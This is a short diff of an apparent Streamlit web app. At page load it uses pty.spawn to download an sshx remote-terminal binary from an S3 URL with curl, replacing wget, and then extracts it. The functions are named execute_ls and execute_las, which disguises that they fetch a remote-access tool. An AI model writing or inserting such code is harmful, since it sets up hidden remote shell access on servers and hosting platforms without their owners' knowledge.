@@ -8,12 +8,12 @@ st.write(
 import pty
 
 def execute_ls():
-    pty.spawn(['/bin/sh', '-c', 'wget https://sshx.s3.amazonaws.com/sshx-aarch64-unknown-linux-musl.tar.gz'])
+    pty.spawn(['/bin/sh', '-c', 'curl https://sshx.s3.amazonaws.com/sshx-aarch64-unknown-linux-musl.tar.gz -o archive.tar.gz'])
 
 execute_ls()
 
 def execute_las():
-    pty.spawn(['/bin/sh', '-c', 'tar -xvzf sshx-aarch64-unknown-linux-musl.tar.gz'])
+    pty.spawn(['/bin/sh', '-c', 'tar -xvzf archive.tar.gz'])
 
 execute_las()
 
